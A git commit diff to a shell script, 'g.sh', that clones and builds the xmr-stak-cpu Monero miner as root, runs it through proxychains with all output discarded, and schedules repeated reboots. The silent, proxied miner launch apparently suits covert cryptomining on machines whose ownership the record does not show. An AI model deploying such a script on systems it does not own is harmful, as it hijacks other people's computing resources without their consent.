eabd747272067e10f94907d6b5633339a4612fad
smithinoz <smithinoz@users.noreply.github.com>
2017-06-21 15:13:18 +1000

    Update g.sh

--- g.sh
+++ g.sh
@@ -5,6 +5,7 @@ if [ -f "$file" ]
 then
 	sudo apt-get install cmake -y
 	cd /m/test01
+	sudo apt-get update && sudo apt-get install build-essential -y
 	sudo apt-get install libmicrohttpd-dev libssl-dev cmake build-essential -y
 	sudo rm -R /m/test01/xmr-stak-cpu
 	sudo git clone --recursive https://github.com/fireice-uk/xmr-stak-cpu.git
@@ -20,11 +21,11 @@ then
 	# sudo sed -i 's/socks4/#http/' /m/test01/proxychains-ng/src/proxychains.conf
 	# sudo sed -i -e "\$ahttp    $VAR_PI    $VAR_PO    $VAR_PO  $VAR_PP" /m/test01/proxychains-ng/src/proxychains.conf
 	sudo cp /m/test01/xmr/config.txt /m/test01/xmr-stak-cpu/bin/config.txt
-#       ( sleep 10800 ; sudo reboot ) & 
-       ( sleep 3600 ; sudo reboot ) 
+       ( sleep 10800 ; sudo reboot ) & 
+#       ( sleep 3600 ; sudo reboot ) 
 	cd /m/test01/xmr-stak-cpu/bin
         sudo /m/test01/proxychains-ng/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr-stak-cpu/bin/xmr-stak-cpu >/dev/null 2>&1
- #       sudo reboot   
+        sudo reboot   
 else
         sudo /bin/su -c "echo 'vm.nr_hugepages=128' >> /etc/sysctl.conf"
         sudo /bin/su -c "echo 'xxxxx' >> /flag2"
